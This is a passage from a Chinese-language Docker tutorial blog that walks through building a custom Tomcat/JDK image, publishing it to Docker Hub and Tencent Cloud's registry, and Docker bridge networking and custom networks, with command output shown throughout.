-i &#x27;</span>s/mirrorlist/<span class="comment">#mirrorl…   8.82kB    buildkit.dockerfile.v0</span></span><br><span class="line">&lt;missing&gt;      6 minutes ago   RUN /bin/sh -c <span class="built_in">cd</span> /etc/yum.repos.d/ <span class="comment"># buildk…   0B        buildkit.dockerfile.v0</span></span><br><span class="line">&lt;missing&gt;      6 minutes ago   WORKDIR /usr/local                              0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      6 minutes ago   ENV MYPATH=/usr/local                           0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      6 minutes ago   MAINTAINER 6pc1&lt;pc6pc1@qq.com&gt;                  0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      3 years ago     /bin/sh -c <span class="comment">#(nop)  CMD [&quot;/bin/bash&quot;]            0B        </span></span><br><span class="line">&lt;missing&gt;      3 years ago     /bin/sh -c <span class="comment">#(nop)  LABEL org.label-schema.sc…   0B        </span></span><br><span class="line">&lt;missing&gt;      3 years ago     /bin/sh -c <span class="comment">#(nop) ADD file:805cb5e15fb6e0bb0…   231MB     </span></span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>CMD和ENTRYPOINT的去呗</p>
</blockquote>
<p>我们之前说过，两个命令都是指定一个容器启动时要运行的命令</p>
<p><strong>CMD</strong>：Dockerfifile 中可以有多个CMD 指令，但只有最后一个生效，CMD 会被 docker run 之后的参数</p>
<p>替换！</p>
<p><strong>ENTRYPOINT</strong>：docker run 之后的参数会被当做参数传递给 ENTRYPOINT，之后形成新的命令组合！</p>
<blockquote>
<p>自定义镜像tomcat</p>
</blockquote>
<ol>
<li><p>新建一个路径，并准备好tomcat和jdk的压缩包（官网下载后本地上传到服务器），并新建一个read.txt、新建一个Dockfile文件，并编辑</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># cat Dockerfile </span></span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">MAINTAINER 6pc1&lt;pc6pc1@qq.com&gt;</span><br><span class="line"></span><br><span class="line">COPY 1.txt /usr/local/read.txt</span><br><span class="line"></span><br><span class="line">ADD apache-tomcat-9.0.95.tar /usr/local/</span><br><span class="line">ADD jdk-8u202-linux-x64.tar /usr/local/</span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">cd</span> /etc/yum.repos.d/</span><br><span class="line">RUN sed -i <span class="string">&#x27;s/mirrorlist/#mirrorlist/g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN sed -i <span class="string">&#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN yum -y install vim</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line"></span><br><span class="line">WORKDIR <span class="variable">$MYPATH</span></span><br><span class="line"></span><br><span class="line">ENV JAVA_HOME /usr/local/jdk_1.8.0_202</span><br><span class="line">ENV CLASSPATH <span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.95</span><br><span class="line">ENV CATALINA_BASE /usr/local/apache-tomcat-9.0.95</span><br><span class="line">ENV PATH <span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$CATALINA_HOME</span>/lib:<span class="variable">$CATALINA_HOME</span>/bin</span><br><span class="line"></span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.95/bin/startup.sh &amp;&amp; <span class="built_in">tail</span> -F /usr/local/apache-tomcat-9.0.95/bin/logs/catalina.out</span><br></pre></td></tr></table></figure>
</li>
<li><p>构建镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker build -t diytomcat .</span></span><br><span class="line">[+] Building 146.5s (14/14) FINISHED                                                                docker:default</span><br><span class="line"> =&gt; [internal] load build definition from Dockerfile                                                          0.0s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 866B                                                                          0.0s</span><br><span class="line"> =&gt; [internal] load metadata <span class="keyword">for</span> docker.io/library/centos:latest                                              0.0s</span><br><span class="line"> =&gt; [internal] load .dockerignore                                                                             0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 2B                                                                               0.0s</span><br><span class="line"> =&gt; CACHED [1/9] FROM docker.io/library/centos:latest                                                         0.0s</span><br><span class="line"> =&gt; [internal] load build context                                                                             2.5s</span><br><span class="line"> =&gt; =&gt; transferring context: 206.81MB                                                                         2.5s</span><br><span class="line"> =&gt; [2/9] COPY 1.txt /usr/local/read.txt                                                                      0.3s</span><br><span class="line"> =&gt; [3/9] ADD apache-tomcat-9.0.95.tar.gz /usr/local/                                                         0.4s</span><br><span class="line"> =&gt; [4/9] ADD jdk-8u202-linux-x64.tar.gz /usr/local/                                                          4.1s</span><br><span class="line"> =&gt; [5/9] RUN <span class="built_in">cd</span> /etc/yum.repos.d/                                                                            0.7s</span><br><span class="line"> =&gt; [6/9] RUN sed -i <span class="string">&#x27;s/mirrorlist/#mirrorlist/g&#x27;</span> /etc/yum.repos.d/CentOS-*                                   0.3s</span><br><span class="line"> =&gt; [7/9] RUN sed -i <span class="string">&#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27;</span> /etc/yum.repos.  0.4s</span><br><span class="line"> =&gt; [8/9] RUN yum -y install vim                                                                            134.1s</span><br><span class="line"> =&gt; [9/9] WORKDIR /usr/local                                                                                  0.1s </span><br><span class="line"> =&gt; exporting to image                                                                                        3.3s </span><br><span class="line"> =&gt; =&gt; exporting layers                                                                                       3.2s </span><br><span class="line"> =&gt; =&gt; writing image sha256:88021913b4f29d54ed2453c16e79d7259ab5414f3dc616c6d4e98ca6dad90743                  0.0s </span><br><span class="line"> =&gt; =&gt; naming to docker.io/library/diytomcat  </span><br><span class="line"> root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker images                                    </span></span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED          SIZE</span><br><span class="line">diytomcat    latest    88021913b4f2   34 seconds ago   718MB</span><br><span class="line">mycentos     1.0       c3dec9b6a3f8   59 minutes ago   312MB</span><br><span class="line">centos       latest    5d0da3dc9764   3 years ago      231MB</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker run -d -p 9090:8080 --name mydiytomcat -v /home/ubuntu/test/docker-test-volume/tomcat/test:/usr/local/apache-tomcat-9.0.95/webapps/test diytomcat</span></span><br><span class="line">99f621377dba54b318e382d8f72a16ddf321888392d27b5772e1a7eeb3b1fadf</span><br></pre></td></tr></table></figure>
</li>
<li><p>结合前面学习的容器卷将测试的web服务test发布</p>
<p>WEB-INF下新建一个web.xml</p>
<p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">id</span>=<span class="string">&quot;WebApp_ID&quot;</span> <span class="attr">version</span>=<span class="string">&quot;2.5&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">display-name</span>&gt;</span>test<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在test下新建一个a.jsp</p>
<p>a.jsp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt; </span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">		&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">		&lt;title&gt;hello，kuangshen&lt;/title&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		-----------welcome------------</span><br><span class="line">		&lt;%=<span class="string">&quot; my docker tomcat &quot;</span>%&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;% System.out.println(<span class="string">&quot;-------my docker tomcat-------&quot;</span>);%&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="5、发布镜像"><a href="#5、发布镜像" class="headerlink" title="5、发布镜像"></a>5、发布镜像</h2><blockquote>
<p>DockerHub（不建议，大概率登录超时感觉）</p>
</blockquote>
<ol>
<li>注册dockerhub  <a href="https://hub.docker.com/%EF%BC%8C%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA%E8%B4%A6%E5%8F%B7">https://hub.docker.com/，注册一个账号</a></li>
</ol>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-23/a6ca8d34b74dcf6ad91395705579a106--078a--image-20240923204922044.png" alt="image-20240923204922044"></p>
<ol start="2">
<li>登录</li>
<li>docker push直接push到仓库中，记得加tag</li>
</ol>
<blockquote>
<p>腾讯云镜像服务</p>
</blockquote>
<ol>
<li><p>使用个人免费版仓库</p>
<p>这要注意，只有个别地方才能选择个人免费版仓库，这边我选择的是广州</p>
</li>
<li><p>创建命名空间和仓库</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/09d9e244fac1fcb6e6451bd95a5dd738--c8bc--image-20240925165555292.png" alt="image-20240925165555292"></p>
</li>
<li><p>直接快捷指令就能将容器上传至仓库了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/20829e4b625bcd77961e47cf15fe20fe--9066--image-20240925165713786.png" alt="image-20240925165713786"></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker login ccr.ccs.tencentyun.com --username=100036351621</span></span><br><span class="line">Password: </span><br><span class="line">WARNING! Your password will be stored unencrypted <span class="keyword">in</span> /root/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/<span class="comment">#credentials-store</span></span><br><span class="line"></span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure>

<h2 id="6、总结"><a href="#6、总结" class="headerlink" title="6、总结"></a>6、总结</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/f728c102a55c9969c391697ddb24b104--7952--image-20240925183039622.png" alt="image-20240925183039622"></p>
<h1 id="九、Docker网络"><a href="#九、Docker网络" class="headerlink" title="九、Docker网络"></a>九、Docker网络</h1><h2 id="1、理解docker0"><a href="#1、理解docker0" class="headerlink" title="1、理解docker0"></a>1、理解docker0</h2><p>准备工作：清空所有的容器，清空所有的镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> -f $(docker ps -a -q)    <span class="comment"># 删除所有容器 </span></span><br><span class="line">docker rmi -f $(docker images -qa) <span class="comment"># 删除全部镜像</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>先做个测试–现象</p>
</blockquote>
<ol>
<li><p>制作一个可以使用<code>ip addr</code>和<code>ping</code>命令的镜像（已经支持的，可以忽略这个步骤）</p>
<p>下载tomcat原生镜像并启动tomcat容器<code>tomcat01</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker run -d -P --name tomcat01 tomcat</span></span><br></pre></td></tr></table></figure>

<p>查看容器<code>tomcat01</code>内部的ip地址，发现报错如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker exec -it tomcat01 ip addr</span></span><br><span class="line">OCI runtime <span class="built_in">exec</span> failed: <span class="built_in">exec</span> failed: unable to start container process: <span class="built_in">exec</span>: <span class="string">&quot;ip&quot;</span>: executable file not found <span class="keyword">in</span> <span class="variable">$PATH</span>: unknown</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker exec -it tomcat01 /bin/bash</span></span><br><span class="line">\\root@fb4000629c55:/usr/local/tomcat<span class="comment"># ip addr</span></span><br><span class="line">bash: ip: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>进入容器执行命令，即可解决</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install -y iproute2</span><br></pre></td></tr></table></figure>

<p>在容器<code>tomcat01</code>ping一下，发现报错如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@fb4000629c55:/usr/local/tomcat<span class="comment"># ping 172.17.0.2</span></span><br><span class="line">bash: ping: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>进入容器执行命令，即可解决</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y iputils-ping</span><br></pre></td></tr></table></figure>

<p>容器执行了上面两个命令后，就可以正常使用<code>ip addr</code>和<code>ping</code>这两个命令了，然后我们把容器commit一下，就有个一个新的镜像了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker commit fb4000629c55 my-tomcat01:1.0</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看一下主机本地的ip 地址<code>ip addr</code></p>
<ul>
<li><p>lo 本机回环地址</p>
</li>
<li><p>eth0 阿里云的私有ip</p>
</li>
<li><p>docker0  docker网桥</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/846f432f3bb1ac63bb7d25b7de5f8c2f--fb7d--image-20240925185532091.png" alt="image-20240925185532091"></p>
</li>
<li><p>启动容器<code>tomcat01</code>,查看一下容器的ip，然后再查一下主机本地ip</p>
<p>docker会给每个容器都分配一个ip</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/9791e62266d3c6d5a8bc17a6068664f7--1062--image-20240925185336056.png" alt="image-20240925185336056"></p>
</li>
<li><p>我们再起一个容器，结果能够发现两个容器之间是能够ping通的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@fb4000629c55:/usr/local/tomcat<span class="comment"># ping 172.17.0.3</span></span><br><span class="line">PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.099 ms</span><br><span class="line">64 bytes from 172.17.0.3: icmp_seq=2 ttl=64 time=0.067 ms</span><br><span class="line">64 bytes from 172.17.0.3: icmp_seq=3 ttl=64 time=0.064 ms</span><br><span class="line">64 bytes from 172.17.0.3: icmp_seq=4 ttl=64 time=0.060 ms</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>原理</p>
</blockquote>
<ol>
<li><p>每一个安装了Docker的linux主机都有一个docker0的虚拟网卡。这是个桥接网卡，使用了veth-pair</p>
<p>技术！</p>
</li>
<li><p>每启动一个容器，linux主机就会多了一个虚拟网卡。</p>
<p>veth-pair 就是一对的虚拟设备接口，它都是成对出现的。一端连着协议栈，一端彼此相连着。</p>
<p>正因为有这个特性，它常常充当着一个桥梁，连接着各种虚拟网络设备!</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/e4b78b4838e2a9c46e21b74356f18387--5b2e--image-20240925185927195.png" alt="image-20240925185927195"></p>
<p>结论：tomcat1和tomcat2共用一个路由器。是的，他们使用的一个，就是docker0。任何一个容器启动</p>
<p>默认都是docker0网络。</p>
<p>docker默认会给容器分配一个可用ip。</p>
<blockquote>
<p>小结</p>
</blockquote>
<p>Docker使用Linux桥接，在宿主机虚拟一个Docker容器网桥(docker0)，Docker启动一个容器时会根据</p>
<p>Docker网桥的网段分配给容器一个IP地址，称为Container-IP，同时Docker网桥是每个容器的默认网</p>
<p>关。因为在同一宿主机内的容器都接入同一个网桥，这样容器之间就能够通过容器的Container-IP直接</p>
<p>通信。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/b5514df66fdbaa3587500b1413900596--f81e--image-20240925185950744.png" alt="image-20240925185950744"></p>
<p>Docker容器网络就很好的利用了Linux虚拟网络技术，在本地主机和容器内分别创建一个虚拟接口，并</p>
<p>让他们彼此联通（这样一对接口叫veth pair）；</p>
<p>Docker中的网络接口默认都是虚拟的接口。虚拟接口的优势就是转发效率极高（因为Linux是在内核中</p>
<p>进行数据的复制来实现虚拟接口之间的数据转发，无需通过外部的网络设备交换），对于本地系统和容</p>
<p>器系统来说，虚拟接口跟一个正常的以太网卡相比并没有区别，只是他的速度快很多。</p>
<h2 id="2、–link"><a href="#2、–link" class="headerlink" title="2、–link"></a>2、–link</h2><p>思考一个场景，我们编写一个微服务，数据库连接地址原来是使用ip的，如果ip变化就不行了，那我们</p>
<p>能不能使用服务名访问呢？</p>
<p>jdbc:mysql:&#x2F;&#x2F;mysql:3306，这样的话哪怕mysql重启，我们也不需要修改配置了！docker提供了 –link</p>
<p>的操作！</p>
<blockquote>
<p>原理</p>
</blockquote>
<p>单纯是修改了host文件使容器名指向了对应的ip地址</p>
<p>从而可以直接访问对应的容器名</p>
<p>–link早都过时了，我们不推荐使用！我们可以使用自定义网络的方式</p>
<h2 id="3、自定义网络"><a href="#3、自定义网络" class="headerlink" title="3、自定义网络"></a>3、自定义网络</h2><blockquote>
<p>基本命令查看</p>
</blockquote>
<p>命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network --help</span></span><br><span class="line"></span><br><span class="line">Usage:  docker network COMMAND</span><br><span class="line"></span><br><span class="line">Manage networks</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  connect     Connect a container to a network</span><br><span class="line">  create      Create a network</span><br><span class="line">  disconnect  Disconnect a container from a network</span><br><span class="line">  inspect     Display detailed information on one or more networks</span><br><span class="line">  <span class="built_in">ls</span>          List networks</span><br><span class="line">  prune       Remove all unused networks</span><br><span class="line">  <span class="built_in">rm</span>          Remove one or more networks</span><br><span class="line"></span><br><span class="line">Run <span class="string">&#x27;docker network COMMAND --help&#x27;</span> <span class="keyword">for</span> more information on a <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>

<p><strong>查看所有网络</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network ls</span></span><br><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">6ebce816547d   bridge    bridge    <span class="built_in">local</span></span><br><span class="line">05ae65613256   host      host      <span class="built_in">local</span></span><br><span class="line">e0876b8be916   none      null      <span class="built_in">local</span></span><br></pre></td></tr></table></figure>

<p>所有网络模式</p>
<table>
<thead>
<tr>
<th>网络模式</th>
<th>配置</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>bridge模式</td>
<td>–net&#x3D;bridge</td>
<td>默认值，在Docker网桥docker0上为容器创建新的网络栈</td>
</tr>
<tr>
<td>none模式</td>
<td>–net&#x3D;none</td>
<td>不配置网络，用户可以稍后进入容器，自行配置</td>
</tr>
<tr>
<td>container模式</td>
<td>–net&#x3D;container:name&#x2F;id</td>
<td>容器和另外一个容器共享Network namespace。kubernetes中的pod就是多个容器共享一个Network namespace</td>
</tr>
<tr>
<td>host模式</td>
<td>–net&#x3D;host</td>
<td>容器和宿主机共享Network namespace</td>
</tr>
<tr>
<td>用户自定义模式</td>
<td>–net&#x3D;自定义网络</td>
<td>用户自己使用network相关命令定义网络，创建容器的时候可以指定为自己定义的网络</td>
</tr>
</tbody></table>
<p><strong>查看一个具体的网络的详情</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network inspect 6ebce816547d</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;bridge&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Id&quot;</span>: <span class="string">&quot;6ebce816547d589207a8b545c4a79bb1f3f0f4219a3794b08e2669c97f2c52f8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Created&quot;</span>: <span class="string">&quot;2024-09-21T20:29:18.36204997+08:00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Scope&quot;</span>: <span class="string">&quot;local&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Driver&quot;</span>: <span class="string">&quot;bridge&quot;</span>,</span><br><span class="line">        <span class="string">&quot;EnableIPv6&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;IPAM&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Driver&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Options&quot;</span>: null,</span><br><span class="line">            <span class="string">&quot;Config&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;Subnet&quot;</span>: <span class="string">&quot;172.17.0.0/16&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Gateway&quot;</span>: <span class="string">&quot;172.17.0.1&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;Internal&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Attachable&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Ingress&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;ConfigFrom&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Network&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;ConfigOnly&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Containers&quot;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;Options&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;com.docker.network.bridge.default_bridge&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.docker.network.bridge.enable_icc&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.docker.network.bridge.enable_ip_masquerade&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.docker.network.bridge.host_binding_ipv4&quot;</span>: <span class="string">&quot;0.0.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.docker.network.bridge.name&quot;</span>: <span class="string">&quot;docker0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.docker.network.driver.mtu&quot;</span>: <span class="string">&quot;1500&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;Labels&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>拓展：</p>
<ul>
<li>172.17.0.0&#x2F;16 是一个 CIDR 地址，其中 &#x2F;16 表示子网掩码的位数，即 255.255.0.0。这个地址范围内的 IP 地址数量是 2^16 - 2 &#x3D; 65534。其中，2^16 表示该地址范围内的 IP 地址总数，而减去 2 是因为该地址范围内的第一个 IP 地址是网络地址，最后一个 IP 地址是广播地址，不能使用</li>
<li>172.17.0.0&#x2F;24 是一个 CIDR 地址，其中 &#x2F;24 表示子网掩码的位数，即 255.255.255.0。这个地址范围内的 IP 地址数量是 2^8 - 2 &#x3D; 254。其中，2^8 表示该地址范围内的 IP 地址总数，而减去 2 是因为该地址范围内的第一个 IP 地址是网络地址，最后一个 IP 地址是广播地址，不能使用。</li>
</ul>
<blockquote>
<p>自定义网卡</p>
</blockquote>
<ol>
<li><p>删除原来的所有的容器（这样干净一点）</p>
<p>这样网络就恢复最初的样子了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># ip addr</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 52:54:00:58:5e:1a brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    altname enp0s5</span><br><span class="line">    altname ens5</span><br><span class="line">    inet 10.0.16.10/22 metric 100 brd 10.0.19.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe58:5e1a/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span><br><span class="line">    <span class="built_in">link</span>/ether 02:42:99:03:57:1b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:99ff:fe03:571b/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
</li>
<li><p>自定义网络</p>
<p>查看命令使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自定义一个网络</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network create --driver bridge --subnet 192.17.0.0/16 --gateway 192.17.0.1 mynet</span></span><br><span class="line">ecef3e6ceef718e93c001b8068e0c824086046e1e5196b050fab6ef65a8903b9</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network ls</span></span><br><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">6ebce816547d   bridge    bridge    <span class="built_in">local</span></span><br><span class="line">05ae65613256   host      host      <span class="built_in">local</span></span><br><span class="line">ecef3e6ceef7   mynet     bridge    <span class="built_in">local</span></span><br><span class="line">e0876b8be916   none      null      <span class="built_in">local</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network inspect mynet</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;mynet&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Id&quot;</span>: <span class="string">&quot;ecef3e6ceef718e93c001b8068e0c824086046e1e5196b050fab6ef65a8903b9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Created&quot;</span>: <span class="string">&quot;2024-09-25T19:29:21.684869939+08:00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Scope&quot;</span>: <span class="string">&quot;local&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Driver&quot;</span>: <span class="string">&quot;bridge&quot;</span>,</span><br><span class="line">        <span class="string">&quot;EnableIPv6&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;IPAM&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Driver&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Options&quot;</span>: &#123;&#125;,</span><br><span class="line">            <span class="string">&quot;Config&quot;</span>: [</span><br><span class="line">                